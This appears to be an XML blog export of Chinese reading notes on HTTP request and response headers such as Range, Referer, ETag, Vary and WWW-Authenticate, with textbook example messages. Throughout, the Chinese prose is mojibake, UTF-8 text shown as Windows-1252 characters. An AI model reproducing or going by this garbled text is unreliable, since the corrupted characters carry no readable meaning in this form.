çš„ä½œç”¨ç›¸åã€‚å®ƒçš„ä½œç”¨çš„æ˜¯å‘ŠçŸ¥æœåŠ¡å™¨ï¼ŒæŒ‡å®šçš„è¯·æ±‚èµ„æºåªæœ‰åœ¨å­—æ®µå€¼å†…æŒ‡å®šçš„æ—¥æœŸæ—¶é—´ä¹‹åŽï¼Œæœªå‘ç”Ÿæ›´æ–°çš„æƒ…å†µä¸‹ï¼Œæ‰èƒ½å¤„ç†è¯·æ±‚ã€‚å¦‚æžœåœ¨æŒ‡å®šæ—¥æœŸæ—¶é—´åŽå‘ç”Ÿäº†æ›´æ–°ï¼Œåˆ™ä»¥çŠ¶æ€ç  412 Precondition Failed ä½œä¸ºå“åº”è¿”å›žã€‚ Max-Forwards å›¾ï¼šæ¯æ¬¡è½¬å‘æ•°å€¼å‡ 1ã€‚å½“æ•°å€¼å˜ 0 æ—¶è¿”å›žå“åº” é€šè¿‡ TRACE æ–¹æ³•æˆ– OPTIONS æ–¹æ³•ï¼Œå‘é€åŒ…å«é¦–éƒ¨å­—æ®µ Max-Forwards çš„è¯·æ±‚æ—¶ï¼Œè¯¥å­—æ®µä»¥åè¿›åˆ¶æ•´æ•°å½¢å¼æŒ‡å®šå¯ç»è¿‡çš„æœåŠ¡å™¨æœ€å¤§æ•°ç›®ã€‚æœåŠ¡å™¨åœ¨å¾€ä¸‹ä¸€ä¸ªæœåŠ¡å™¨è½¬å‘è¯·æ±‚ä¹‹å‰ï¼ŒMax-Forwards çš„å€¼å‡ 1 åŽé‡æ–°èµ‹å€¼ã€‚å½“æœåŠ¡å™¨æŽ¥æ”¶åˆ° Max-Forwards å€¼ä¸º 0 çš„è¯·æ±‚æ—¶ï¼Œåˆ™ä¸å†è¿›è¡Œè½¬å‘ï¼Œè€Œæ˜¯ç›´æŽ¥è¿”å›žå“åº”ã€‚ ä½¿ç”¨ HTTP åè®®é€šä¿¡æ—¶ï¼Œè¯·æ±‚å¯èƒ½ä¼šç»è¿‡ä»£ç†ç­‰å¤šå°æœåŠ¡å™¨ã€‚é€”ä¸­ï¼Œå¦‚æžœä»£ç†æœåŠ¡å™¨ç”±äºŽæŸäº›åŽŸå› å¯¼è‡´è¯·æ±‚è½¬å‘å¤±è´¥ï¼Œå®¢æˆ·ç«¯ä¹Ÿå°±ç­‰ä¸åˆ°æœåŠ¡å™¨è¿”å›žçš„å“åº”äº†ã€‚å¯¹æ­¤ï¼Œæˆ‘ä»¬æ— ä»Žå¯çŸ¥ã€‚ å¯ä»¥çµæ´»ä½¿ç”¨é¦–éƒ¨å­—æ®µ Max-Forwardsï¼Œé’ˆå¯¹ä»¥ä¸Šé—®é¢˜äº§ç”Ÿçš„åŽŸå› å±•å¼€è°ƒæŸ¥ã€‚ç”±äºŽå½“ Max-Forwards å­—æ®µå€¼ä¸º 0 æ—¶ï¼ŒæœåŠ¡å™¨å°±ä¼šç«‹å³è¿”å›žå“åº”ï¼Œç”±æ­¤æˆ‘ä»¬è‡³å°‘å¯ä»¥å¯¹ä»¥é‚£å°æœåŠ¡å™¨ä¸ºç»ˆç‚¹çš„ä¼ è¾“è·¯å¾„çš„é€šä¿¡çŠ¶å†µæœ‰æ‰€æŠŠæ¡ã€‚ Proxy-Authorization1Proxy-Authorization: Basic dGlwOjkpNLAGfFY5 æŽ¥æ”¶åˆ°ä»Žä»£ç†æœåŠ¡å™¨å‘æ¥çš„è®¤è¯è´¨è¯¢æ—¶ï¼Œå®¢æˆ·ç«¯ä¼šå‘é€åŒ…å«é¦–éƒ¨å­—æ®µProxy-Authorization çš„è¯·æ±‚ï¼Œä»¥å‘ŠçŸ¥æœåŠ¡å™¨è®¤è¯æ‰€éœ€è¦çš„ä¿¡æ¯ã€‚è¿™ä¸ªè¡Œä¸ºæ˜¯ä¸Žå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ HTTP è®¿é—®è®¤è¯ç›¸ç±»ä¼¼çš„ï¼Œä¸åŒä¹‹å¤„åœ¨äºŽï¼Œè®¤è¯è¡Œä¸ºå‘ç”Ÿåœ¨å®¢æˆ·ç«¯ä¸Žä»£ç†ä¹‹é—´ã€‚å®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨ä¹‹é—´çš„è®¤è¯ï¼Œä½¿ç”¨é¦–éƒ¨å­—æ®µ Authorization å¯èµ·åˆ°ç›¸åŒä½œç”¨ã€‚æœ‰å…³ HTTP è®¿é—®è®¤è¯ï¼ŒåŽé¢çš„ç« èŠ‚ä¼šä½œè¯¦å°½é˜è¿°ã€‚ Range1Range: bytes=5001-10000 å¯¹äºŽåªéœ€èŽ·å–éƒ¨åˆ†èµ„æºçš„èŒƒå›´è¯·æ±‚ï¼ŒåŒ…å«é¦–éƒ¨å­—æ®µ Range å³å¯å‘ŠçŸ¥æœåŠ¡å™¨èµ„æºçš„æŒ‡å®šèŒƒå›´ã€‚ä¸Šé¢çš„ç¤ºä¾‹è¡¨ç¤ºè¯·æ±‚èŽ·å–ä»Žç¬¬ 5001 å­—èŠ‚è‡³ç¬¬10000 å­—èŠ‚çš„èµ„æºã€‚ æŽ¥æ”¶åˆ°é™„å¸¦ Range é¦–éƒ¨å­—æ®µè¯·æ±‚çš„æœåŠ¡å™¨ï¼Œä¼šåœ¨å¤„ç†è¯·æ±‚ä¹‹åŽè¿”å›žçŠ¶æ€ç ä¸º 206 Partial Content çš„å“åº”ã€‚æ— æ³•å¤„ç†è¯¥èŒƒå›´è¯·æ±‚æ—¶ï¼Œåˆ™ä¼šè¿”å›žçŠ¶æ€ç  200 OK çš„å“åº”åŠå…¨éƒ¨èµ„æºã€‚ Referer 1Referer: http://www.hackr.jp/index.htm é¦–éƒ¨å­—æ®µ Referer ä¼šå‘ŠçŸ¥æœåŠ¡å™¨è¯·æ±‚çš„åŽŸå§‹èµ„æºçš„ URIã€‚ å®¢æˆ·ç«¯ä¸€èˆ¬éƒ½ä¼šå‘é€ Referer é¦–éƒ¨å­—æ®µç»™æœåŠ¡å™¨ã€‚ä½†å½“ç›´æŽ¥åœ¨æµè§ˆå™¨çš„åœ°å€æ è¾“å…¥ URIï¼Œæˆ–å‡ºäºŽå®‰å…¨æ€§çš„è€ƒè™‘æ—¶ï¼Œä¹Ÿå¯ä»¥ä¸å‘é€è¯¥é¦–éƒ¨å­—æ®µã€‚ å› ä¸ºåŽŸå§‹èµ„æºçš„ URI ä¸­çš„æŸ¥è¯¢å­—ç¬¦ä¸²å¯èƒ½å«æœ‰ ID å’Œå¯†ç ç­‰ä¿å¯†ä¿¡æ¯ï¼Œè¦æ˜¯å†™è¿› Referer è½¬å‘ç»™å…¶ä»–æœåŠ¡å™¨ï¼Œåˆ™æœ‰å¯èƒ½å¯¼è‡´ä¿å¯†ä¿¡æ¯çš„æ³„éœ²ã€‚ å¦å¤–ï¼ŒReferer çš„æ­£ç¡®çš„æ‹¼å†™åº”è¯¥æ˜¯ Referrerï¼Œä½†ä¸çŸ¥ä¸ºä½•ï¼Œå¤§å®¶ä¸€ç›´æ²¿ç”¨è¿™ä¸ªé”™è¯¯çš„æ‹¼å†™ã€‚ TE1TE: gzip, deflate;q=0.5 é¦–éƒ¨å­—æ®µ TE ä¼šå‘ŠçŸ¥æœåŠ¡å™¨å®¢æˆ·ç«¯èƒ½å¤Ÿå¤„ç†å“åº”çš„ä¼ è¾“ç¼–ç æ–¹å¼åŠç›¸å¯¹ä¼˜å…ˆçº§ã€‚å®ƒå’Œé¦–éƒ¨å­—æ®µ Accept-Encoding çš„åŠŸèƒ½å¾ˆç›¸åƒï¼Œä½†æ˜¯ç”¨äºŽä¼ è¾“ç¼–ç ã€‚ é¦–éƒ¨å­—æ®µ TE é™¤æŒ‡å®šä¼ è¾“ç¼–ç ä¹‹å¤–ï¼Œè¿˜å¯ä»¥æŒ‡å®šä¼´éš trailer å­—æ®µçš„åˆ†å—ä¼ è¾“ç¼–ç çš„æ–¹å¼ã€‚åº”ç”¨åŽè€…æ—¶ï¼Œåªéœ€æŠŠ trailers èµ‹å€¼ç»™è¯¥å­—æ®µå€¼ã€‚ 1TE: trailers User-Agent1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/201001 é¦–éƒ¨å­—æ®µ User-Agent ä¼šå°†åˆ›å»ºè¯·æ±‚çš„æµè§ˆå™¨å’Œç”¨æˆ·ä»£ç†åç§°ç­‰ä¿¡æ¯ä¼ è¾¾ç»™æœåŠ¡å™¨ã€‚ç”±ç½‘ç»œçˆ¬è™«å‘èµ·è¯·æ±‚æ—¶ï¼Œæœ‰å¯èƒ½ä¼šåœ¨å­—æ®µå†…æ·»åŠ çˆ¬è™«ä½œè€…çš„ç”µå­é‚®ä»¶åœ°å€ã€‚æ­¤å¤–ï¼Œå¦‚æžœè¯·æ±‚ç»è¿‡ä»£ç†ï¼Œé‚£ä¹ˆä¸­é—´ä¹Ÿå¾ˆå¯èƒ½è¢«æ·»åŠ ä¸Šä»£ç†æœåŠ¡å™¨çš„åç§°ã€‚ å“åº”é¦–éƒ¨å­—æ®µå“åº”é¦–éƒ¨å­—æ®µæ˜¯ç”±æœåŠ¡å™¨ç«¯å‘å®¢æˆ·ç«¯è¿”å›žå“åº”æŠ¥æ–‡ä¸­æ‰€ä½¿ç”¨çš„å­—æ®µï¼Œç”¨äºŽè¡¥å……å“åº”çš„é™„åŠ æ¶ˆæ¯ã€æœåŠ¡å™¨æ¶ˆæ¯ï¼Œä»¥åŠå¯¹å®¢æˆ·ç«¯çš„é™„åŠ è¦æ±‚ç­‰æ¶ˆæ¯ã€‚ Accept-Ranges1Accept-Ranges: bytes é¦–éƒ¨å­—æ®µ Accept-Ranges æ˜¯ç”¨æ¥å‘ŠçŸ¥å®¢æˆ·ç«¯æœåŠ¡å™¨æ˜¯å¦èƒ½å¤„ç†èŒƒå›´è¯·æ±‚ï¼Œä»¥æŒ‡å®šèŽ·å–æœåŠ¡å™¨ç«¯æŸä¸ªéƒ¨åˆ†çš„èµ„æºã€‚ å¯æŒ‡å®šçš„å­—æ®µå€¼æœ‰ä¸¤ç§ï¼Œå¯å¤„ç†èŒƒå›´è¯·æ±‚æ—¶æŒ‡å®šå…¶ä¸º bytes ï¼Œåä¹‹åˆ™æŒ‡å®šå…¶ä¸º noneã€‚ Age 1Age: 600 é¦–éƒ¨å­—æ®µ Age èƒ½å‘ŠçŸ¥å®¢æˆ·ç«¯ï¼ŒæºæœåŠ¡å™¨åœ¨å¤šä¹…å‰åˆ›å»ºäº†å“åº”ã€‚å­—æ®µå€¼çš„å•ä½ä¸ºç§’ã€‚ è‹¥åˆ›å»ºè¯¥å“åº”çš„æœåŠ¡å™¨æ˜¯ç¼“å­˜æœåŠ¡å™¨ï¼ŒAge å€¼æ˜¯æŒ‡ç¼“å­˜åŽçš„å“åº”å†æ¬¡å‘èµ·è®¤è¯åˆ°è®¤è¯å®Œæˆçš„æ—¶é—´å€¼ã€‚ä»£ç†åˆ›å»ºå“åº”æ—¶å¿…é¡»åŠ ä¸Šé¦–éƒ¨å­—æ®µ Ageã€‚ ETag 1ETag: "82e22293907ce725faf67773957acd12" é¦–éƒ¨å­—æ®µ ETag å‘ŠçŸ¥å®¢æˆ·ç«¯å®žä½“æ ‡è¯†ã€‚å®ƒæ˜¯ä¸€ç§å¯å°†èµ„æºä»¥å­—ç¬¦ä¸²å½¢å¼åšå”¯ä¸€æ€§æ ‡è¯†çš„å‘ŠçŸ¥æ–¹å¼ã€‚æœåŠ¡å™¨ä¼šä»¥æ²¡ä»½èµ„æºåˆ†é…å¯¹åº”çš„ ETag å€¼ã€‚å¦å¤–ï¼Œå½“èµ„æºæ›´æ–°æ—¶ï¼ŒETag å€¼ä¹Ÿéœ€è¦æ›´æ–°ã€‚ç”Ÿæˆ ETag å€¼æ—¶ï¼Œå¹¶æ²¡æœ‰ç»Ÿä¸€çš„ç®—æ³•è§„åˆ™ï¼Œè€Œä»…ä»…æ˜¯ç”±æœåŠ¡å™¨æ¥åˆ†é…ã€‚ èµ„æºè¢«ç¼“å­˜æ—¶ï¼Œå°±ä¼šè¢«åˆ†é…å”¯ä¸€æ€§æ ‡è¯†ã€‚ä¾‹å¦‚ï¼Œå½“ä½¿ç”¨ä¸­æ–‡ç‰ˆçš„æµè§ˆå™¨è®¿é—® http://www.google.com/ æ—¶ï¼Œå°±ä¼šè¿”å›žä¸­æ–‡ç‰ˆå¯¹åº”çš„èµ„æºï¼Œè€Œä½¿ç”¨è‹±æ–‡ç‰ˆçš„æµè§ˆå™¨è®¿é—®æ—¶ï¼Œåˆ™ä¼šè¿”å›žè‹±æ–‡ç‰ˆå¯¹åº”çš„èµ„æºã€‚ä¸¤è€…çš„URI æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥ä»…å‡­ URI æŒ‡å®šç¼“å­˜çš„èµ„æºæ˜¯ç›¸å½“å›°éš¾çš„ã€‚è‹¥åœ¨ä¸‹è½½è¿‡ç¨‹ä¸­å‡ºçŽ°è¿žæŽ¥ä¸­æ–­ã€å†è¿žæŽ¥çš„æƒ…å†µï¼Œéƒ½ä¼šä¾ç…§ ETag å€¼æ¥æŒ‡å®šèµ„æºã€‚ å¼º ETag å€¼å’Œå¼± Tag å€¼ETag ä¸­æœ‰å¼º ETag å€¼å’Œå¼± ETag å€¼ä¹‹åˆ†ã€‚ å¼º ETag å€¼ï¼Œä¸è®ºå®žä½“å‘ç”Ÿå¤šä¹ˆç»†å¾®çš„å˜åŒ–éƒ½ä¼šæ”¹å˜å…¶å€¼ã€‚ 1ETag: "usagi-1234" å¼± ETag å€¼ï¼Œåªç”¨äºŽæç¤ºèµ„æºæ˜¯å¦ç›¸åŒã€‚åªæœ‰å½“èµ„æºå‘ç”Ÿäº†æ ¹æœ¬çš„å˜åŒ–ï¼Œäº§ç”Ÿå·®å¼‚æ‰ä¼šæ”¹å˜ ETag å€¼ã€‚è¿™æ—¶ï¼Œä¼šåœ¨å­—æ®µå€¼æœ€å¼€å§‹å¤„é™„åŠ  W/ã€‚ 1ETag: W/"usagi-1234" Location 1Location: http://www.usagidesign.jp/sample.html ä½¿ç”¨é¦–éƒ¨å­—æ®µ Location å¯ä»¥å°†å“åº”æŽ¥æ”¶æ–¹å¼•å¯¼è‡³æŸä¸ªä¸Žè¯·æ±‚ URI ä½ç½®ä¸åŒçš„èµ„æºã€‚ åŸºæœ¬ä¸Šï¼Œè¯¥å­—æ®µä¼šé…åˆ 3xx ï¼šRedirection çš„å“åº”ï¼Œæä¾›é‡å®šå‘çš„URIã€‚ å‡ ä¹Žæ‰€æœ‰çš„æµè§ˆå™¨åœ¨æŽ¥æ”¶åˆ°åŒ…å«é¦–éƒ¨å­—æ®µ Location çš„å“åº”åŽï¼Œéƒ½ä¼šå¼ºåˆ¶æ€§åœ°å°è¯•å¯¹å·²æç¤ºçš„é‡å®šå‘èµ„æºçš„è®¿é—®ã€‚ Proxy-Authenticate1Proxy-Authenticate: Basic realm="Usagidesign Auth" é¦–éƒ¨å­—æ®µ Proxy-Authenticate ä¼šæŠŠç”±ä»£ç†æœåŠ¡å™¨æ‰€è¦æ±‚çš„è®¤è¯ä¿¡æ¯å‘é€ç»™å®¢æˆ·ç«¯ã€‚ å®ƒä¸Žå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ HTTP è®¿é—®è®¤è¯çš„è¡Œä¸ºç›¸ä¼¼ï¼Œä¸åŒä¹‹å¤„åœ¨ä¸Žå…¶è®¤è¯è¡Œä¸ºæ˜¯åœ¨å®¢æˆ·ç«¯ä¸Žä»£ç†ä¹‹é—´è¿›è¡Œçš„ï¼Œè€Œå®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨ä¹‹é—´è¿›è¡Œè®¤è¯æ—¶ï¼Œé¦–éƒ¨å­—æ®µ WWW-Authorization æœ‰ç€ç›¸åŒçš„ä½œç”¨ã€‚ Retry-After1Retry-After: 120 é¦–éƒ¨å­—æ®µ Retry-After å‘ŠçŸ¥å®¢æˆ·ç«¯åº”è¯¥åœ¨å¤šä¹…ä¹‹åŽå†æ¬¡å‘é€è¯·æ±‚ã€‚ä¸»è¦é…åˆçŠ¶æ€ç  503 Service Unavailable å“åº”ï¼Œæˆ– 3xx Redirect å“åº”ä¸€èµ·ä½¿ç”¨ã€‚ å­—æ®µå€¼å¯ä»¥æŒ‡å®šä¸ºå…·ä½“çš„æ—¥æœŸæ—¶é—´ï¼ˆWed, 04 Jul 2012 06ï¼š34ï¼š24GMT ç­‰æ ¼å¼ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯åˆ›å»ºå“åº”åŽçš„ç§’æ•°ã€‚ Server 1Server: Apache/2.2.17 (Unix) é¦–éƒ¨å­—æ®µ Server å‘ŠçŸ¥å®¢æˆ·ç«¯å½“å‰æœåŠ¡å™¨ä¸Šå®‰è£…çš„ HTTP æœåŠ¡å™¨åº”ç”¨ç¨‹åºçš„ä¿¡æ¯ã€‚ä¸å•å•ä¼šæ ‡å‡ºæœåŠ¡å™¨ä¸Šçš„è½¯ä»¶åº”ç”¨åç§°ï¼Œè¿˜æœ‰å¯èƒ½åŒ…æ‹¬ç‰ˆæœ¬å·å’Œå®‰è£…æ—¶å¯ç”¨çš„å¯é€‰é¡¹ã€‚ 1Server: Apache/2.2.6 (Unix) PHP/5.2.5 Vary å›¾ï¼šå½“ä»£ç†æœåŠ¡å™¨æŽ¥æ”¶åˆ°å¸¦æœ‰ Vary é¦–éƒ¨å­—æ®µæŒ‡å®šèŽ·å–èµ„æºçš„è¯·æ±‚æ—¶ï¼Œå¦‚æžœä½¿ç”¨çš„ Accept-Language å­—æ®µçš„å€¼ç›¸åŒï¼Œé‚£ä¹ˆå°±ç›´æŽ¥ä»Žç¼“å­˜è¿”å›žå“åº”ã€‚åä¹‹ï¼Œåˆ™éœ€è¦å…ˆä»ŽæºæœåŠ¡å™¨ç«¯èŽ·å–èµ„æºåŽæ‰èƒ½ä½œä¸ºå“åº”è¿”å›ž 1Vary: Accept-Language é¦–éƒ¨å­—æ®µ Vary å¯å¯¹ç¼“å­˜è¿›è¡ŒæŽ§åˆ¶ã€‚æºæœåŠ¡å™¨ä¼šå‘ä»£ç†æœåŠ¡å™¨ä¼ è¾¾å…³äºŽæœ¬åœ°ç¼“å­˜ä½¿ç”¨æ–¹æ³•çš„å‘½ä»¤ã€‚ ä»Žä»£ç†æœåŠ¡å™¨æŽ¥æ”¶åˆ°æºæœåŠ¡å™¨è¿”å›žåŒ…å« Vary æŒ‡å®šé¡¹çš„å“åº”ä¹‹åŽï¼Œè‹¥å†è¦è¿›è¡Œç¼“å­˜ï¼Œä»…å¯¹è¯·æ±‚ä¸­å«æœ‰ç›¸åŒ Vary æŒ‡å®šé¦–éƒ¨å­—æ®µçš„è¯·æ±‚è¿”å›žç¼“å­˜ã€‚å³ä½¿å¯¹ç›¸åŒèµ„æºå‘èµ·è¯·æ±‚ï¼Œä½†ç”±äºŽ Vary æŒ‡å®šçš„é¦–éƒ¨å­—æ®µä¸ç›¸åŒï¼Œå› æ­¤å¿…é¡»è¦ä»ŽæºæœåŠ¡å™¨é‡æ–°èŽ·å–èµ„æºã€‚ WWW-Authenticate1WWW-Authenticate: Basic realm="Usagidesign Auth" é¦–éƒ¨å­—æ®µ WWW-Authenticate ç”¨äºŽ HTTP è®¿é—®è®¤è¯ã€‚å®ƒä¼šå‘ŠçŸ¥å®¢æˆ·ç«¯é€‚ç”¨äºŽè®¿é—®è¯·æ±‚ URI æ‰€æŒ‡å®šèµ„æºçš„è®¤è¯æ–¹æ¡ˆï¼ˆBasic æˆ–æ˜¯ Digestï¼‰å’Œå¸¦å‚æ•°æç¤ºçš„è´¨è¯¢ï¼ˆchallengeï¼‰ã€‚çŠ¶æ€ç  401 Unauthorized å“åº”ä¸­ï¼Œè‚¯å®šå¸¦æœ‰é¦–éƒ¨å­—æ®µ WWW-Authenticateã€‚ ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œrealm å­—æ®µçš„å­—ç¬¦ä¸²æ˜¯ä¸ºäº†è¾¨åˆ«è¯·æ±‚ URI æŒ‡å®šèµ„æºæ‰€å—åˆ°çš„ä¿æŠ¤ç­–ç•¥ã€‚æœ‰å…³è¯¥é¦–éƒ¨ï¼Œè¯·å‚é˜…æœ¬ç« ä¹‹åŽçš„å†…å®¹ã€‚ å¤ªé•¿äº†ï¼Œå†…å®¹çç¢Žï¼Œçœ‹æ¥è¦å†åˆ†ä¸€å°èŠ‚äº†ï¼Œè¯·æ±‚é¦–éƒ¨å­—æ®µä¸Žå“åº”é¦–éƒ¨å­—æ®µï¼Œè€å¿ƒçœ‹å®ŒåŽæ˜¯ä¸æ˜¯æœ‰è±ç„¶å¼€æœ—çš„å–œæ‚¦(ï¿£â–½ï¿£)~* å‚è€ƒé“¾æŽ¥ï¼šhttps://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥æµ…å‡ºHTTPï¼Œä»Žå¼€å§‹åˆ°æ”¾å¼ƒï¼ˆç¬¬å…­ç« ä¸Šï¼‰â€”â€” HTTP é¦–éƒ¨]]></title>
    <url>%2F2018-08-16-read-%E5%9B%BE%E8%A7%A3HTTP-Part6%E4%B8%8A.html</url>
    <content type="text"><![CDATA[å†…å®¹å¤ªå¤šäº†ï¼Œåˆ†æˆä¸¤èŠ‚è®°å½•ã€‚ ç¬¬å…­ç«  HTTP é¦–éƒ¨ï¼ˆä¸Šï¼‰HTTPåè®®çš„è¯·æ±‚å’Œå“åº”æŠ¥æ–‡ä¸­å¿…å®šåŒ…å«HTTPé¦–éƒ¨ï¼Œåªæ˜¯æˆ‘ä»¬åœ¨ä½¿ç”¨Webçš„è¿‡ç¨‹ä¸­æ„Ÿå—ä¸åˆ°å®ƒã€‚ HTTPæŠ¥æ–‡é¦–éƒ¨ HTTPæŠ¥æ–‡åè®®çš„è¯·æ±‚å’Œå“åº”æŠ¥æ–‡ä¸­å¿…å®šåŒ…å«HTTPé¦–éƒ¨ã€‚é¦–éƒ¨å†…å®¹ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åˆ†åˆ«å¤„ç†è¯·æ±‚å’Œå“åº”æä¾›æ‰€éœ€è¦çš„æ¶ˆæ¯ã€‚å¯¹äºŽå®¢æˆ·ç«¯ç”¨æˆ·æ¥è¯´ï¼Œè¿™äº›ä¿¡æ¯ä¸­å¤§éƒ¨åˆ†å†…å®¹éƒ½æ— é¡»äº²è‡ªæŸ¥çœ‹ã€‚ HTTP è¯·æ±‚æŠ¥æ–‡åœ¨è¯·æ±‚ä¸­ï¼ŒHTTPæŠ¥æ–‡ç”±æ–¹æ³•ã€URIã€HTTPç‰ˆæœ¬ã€HTTPé¦–éƒ¨å­—æ®µç­‰éƒ¨åˆ†æž„æˆã€‚ è®¿é—® http://hackr.jp æ—¶ï¼Œè¯·æ±‚æŠ¥æ–‡çš„é¦–éƒ¨æ¶ˆæ¯ 1234567891011GET / HTTP/1.1Host: hackr.jpUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*; q=0.8Accept-Language: ja,en-us;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveIf-Modified-Since: Fri, 31 Aug 2007 02:02:20 GMTIf-None-Match: "45bae1-16a-46d776ac"Cache-Control: max-age=0 HTTP å“åº”æŠ¥æ–‡åœ¨å“åº”ä¸­ï¼ŒHTTPæŠ¥æ–‡ç”±HTTPç‰ˆæœ¬ã€çŠ¶æ€ç ï¼ˆæ•°å­—å’ŒåŽŸå› çŸ­è¯­ï¼‰ã€HTTPé¦–éƒ¨å­—æ®µ3éƒ¨åˆ†æž„æˆã€‚ è¯·æ±‚è®¿é—® http://hackr.jp æ—¶ï¼Œè¿”å›žçš„å“åº”æŠ¥æ–‡çš„é¦–éƒ¨æ¶ˆæ¯ã€‚ 12345HTTP/1.1 304 Not ModifiedDate: Thu, 07 Jun 2012 07:21:36 GMTServer: ApacheConnection: closeEtag: "45bae1-16a-46d776ac" HTTPä¸­é¦–éƒ¨å­—æ®µåŒæ—¶å­˜åœ¨äºŽè¯·æ±‚å’Œå“åº”æŠ¥æ–‡å†…ï¼Œå¹¶æ¶µç›–HTTPæŠ¥æ–‡ç›¸å…³çš„å†…å®¹æ¶ˆæ¯ã€‚ HTTP é¦–éƒ¨å­—æ®µHTTP é¦–éƒ¨å­—æ®µä¼ é€’é‡è¦æ¶ˆæ¯HTTPé¦–éƒ¨å­—æ®µæ˜¯æž„æˆHTTPæŠ¥æ–‡çš„è¦ç´ ä¹‹ä¸€ã€‚åœ¨å®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨ä¹‹é—´ä»¥HTTPåè®®è¿›è¡Œé€šä¿¡çš„è¿‡ç¨‹ä¸­ï¼Œæ— è®ºæ˜¯è¯·æ±‚è¿˜æ˜¯å“åº”éƒ½ä¼šä½¿ç”¨é¦–éƒ¨å­—æ®µï¼Œå®ƒèƒ½èµ·åˆ°é¢å¤–é‡è¦æ¶ˆæ¯çš„ä½œç”¨ã€‚ ä½¿ç”¨é¦–éƒ¨å­—æ®µæ˜¯ä¸ºäº†ç»™æµè§ˆå™¨å’ŒæœåŠ¡å™¨æä¾›æŠ¥æ–‡ä¸»ä½“å¤§å°ã€æ‰€ä½¿ç”¨è¯­è¨€ã€è®¤è¯æ¶ˆæ¯ç­‰å†…å®¹ã€‚ HTTP é¦–éƒ¨å­—æ®µç»“æž„HTTP é¦–éƒ¨å­—æ®µæ˜¯ç”±é¦–éƒ¨å­—æ®µå’Œå­—æ®µå€¼æž„æˆçš„ï¼Œä¸­é—´ç”¨å†’å·â€œï¼šâ€åˆ†éš” 1é¦–éƒ¨å­—æ®µåï¼šå­—æ®µå€¼ ä¾‹å¦‚ï¼Œåœ¨HTTPé¦–éƒ¨ä¸­ä»¥ Content-Type è¿™ä¸ªå­—æ®µæ¥è¡¨ç¤ºæŠ¥æ–‡ä¸»ä½“çš„å¯¹è±¡ç±»åž‹ 1Content-Type: text/html å¦å¤–ï¼Œå­—æ®µå€¼å¯¹åº”å•ä¸ªHTTPé¦–éƒ¨å­—æ®µå¯ä»¥æœ‰å¤šä¸ªå€¼ã€‚ 1Keep-Alive: timeout=15, max=100 è‹¥HTTPé¦–éƒ¨å­—æ®µé‡å¤äº†ä¼šå¦‚ä½• å½“HTTPæŠ¥æ–‡é¦–éƒ¨ä¸­å‡ºçŽ°äº†ä¸¤ä¸ªæˆ–è€…ä¸¤ä¸ªä»¥ä¸Šå…·æœ‰ç›¸åŒé¦–éƒ¨å­—æ®µåæ—¶ä¼šæ€Žä¹ˆæ ·ï¼Ÿè¿™ç§æƒ…å†µåœ¨è§„èŒƒå†…è¿˜æ²¡æ˜Žç¡®ï¼Œæ ¹æ®æµè§ˆå™¨å†…éƒ¨å¤„ç†é€»è¾‘çš„ä¸åŒè€Œä¸åŒã€‚æœ‰äº›æµè§ˆå™¨ä¼šä¼˜å…ˆå¤„ç†ç¬¬ä¸€æ¬¡å‡ºçŽ°çš„é¦–éƒ¨å­—æ®µï¼Œæœ‰äº›åˆ™åä¹‹ã€‚ 4ç§ HTTP é¦–éƒ¨å­—æ®µç±»åž‹HTTP é¦–éƒ¨å­—æ®µæ ¹æ®å®žé™…ç”¨é€”è¢«åˆ†ä¸ºä»¥ä¸‹4ç§ç±»åž‹ HTTP é¦–éƒ¨å­—æ®µç±»åž‹ æè¿° é€šç”¨é¦–éƒ¨å­—æ®µï¼ˆGeneral Header Fieldsï¼‰ è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡ä¸¤æ–¹éƒ½ä¼šä½¿ç”¨çš„é¦–éƒ¨ è¯·æ±‚é¦–éƒ¨å­—æ®µï¼ˆRequest Header Fieldsï¼‰ ä»Žå®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯å‘é€è¯·æ±‚æŠ¥æ–‡æ—¶ä½¿ç”¨çš„é¦–éƒ¨ã€‚è¡¥å……äº†è¯·æ±‚çš„é™„åŠ å†…å®¹ã€å®¢æˆ·ç«¯æ¶ˆæ¯ã€å“åº”å†…å®¹ç›¸å…³ä¼˜å…ˆçº§ç­‰æ¶ˆæ¯ å“åº”é¦–éƒ¨å­—æ®µï¼ˆResponse Header Fieldsï¼‰ ä»ŽæœåŠ¡å™¨ç«¯å‘å®¢æˆ·ç«¯è¿”å›žå“åº”æŠ¥æ–‡æ—¶ä½¿ç”¨çš„é¦–éƒ¨ã€‚è¡¥å……äº†å“åº”çš„é™„åŠ å†…å®¹ï¼Œä¹Ÿè¦æ±‚å®¢æˆ·ç«¯é™„åŠ é¢å¤–çš„å†…å®¹æ¶ˆæ¯ã€‚ å®žä½“é¦–éƒ¨å­—æ®µï¼ˆEntity Header Fieldsï¼‰ é’ˆå¯¹è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡çš„å®žä½“éƒ¨åˆ†ä½¿ç”¨çš„é¦–éƒ¨ã€‚è¡¥å……äº†èµ„æºå†…å®¹æ›´æ–°æ—¶é—´ç­‰ä¸Žå®žä½“æœ‰å…³çš„æ¶ˆæ¯ã€‚ HTTP/1.1 é¦–éƒ¨å­—æ®µä¸€è§ˆHTTP/1.1 è§„èŒƒå®šä¹‰äº†å¦‚ä¸‹47ç§é¦–éƒ¨å­—æ®µ é€šç”¨é¦–éƒ¨å­—æ®µ é¦–éƒ¨å­—æ®µå è¯´æ˜Ž Cache-Control 